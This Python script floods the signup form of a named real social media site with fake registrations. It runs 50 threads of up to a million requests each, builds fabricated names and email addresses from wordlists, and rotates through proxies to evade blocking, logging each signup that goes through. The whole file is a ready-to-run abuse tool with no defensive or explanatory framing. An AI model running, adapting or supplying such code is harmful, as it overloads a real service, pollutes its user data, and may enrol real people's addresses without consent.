#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Oct 29 16:57:04 2021
@authors: isaachorwitz, HiddenToad
"""

import requests
import threading
import random
import logging
import time

logging.basicConfig(filename='log'+str(round(time.time())),
                            filemode='a',
                            format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                            datefmt='%H:%M:%S',
                            level=logging.INFO)

url = 'https://www.truthsocial.com/'



first_names = open('names.txt','r').read().split('\n')
last_names = [x.title() for x in open('last_names.txt','r').read().split('\n')]
domains = ['gmail.com','yahoo.com','hotmail.com','icloud.com','aol.com',
           'comcast.net','outlook.com','sbcglobal.net','msn.com']
proxylist = open('proxies.txt','r').read().split('\n')
def do_request():
    for i in range(1000000):
        proxy = {'http': random.choice(proxylist)}
        first = random.choice(first_names)
        last = random.choice(last_names)
        email = first+random.choice(['-','.','_'])+last+"@"+random.choice(domains)
        data = {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': '',
        'offers': 'on'
       }
        response = requests.post(url,data=data,proxies=proxy).text
        
        if "Thanks" in response:
            print("Success with"+" "+str(first)+" "+str(last)+" "+str(email)+" "+proxy['http'])
            logging.info("Success with"+" "+str(first)+" "+str(last)+" "+str(email)+" "+proxy['http'])
            
threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)
    
for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
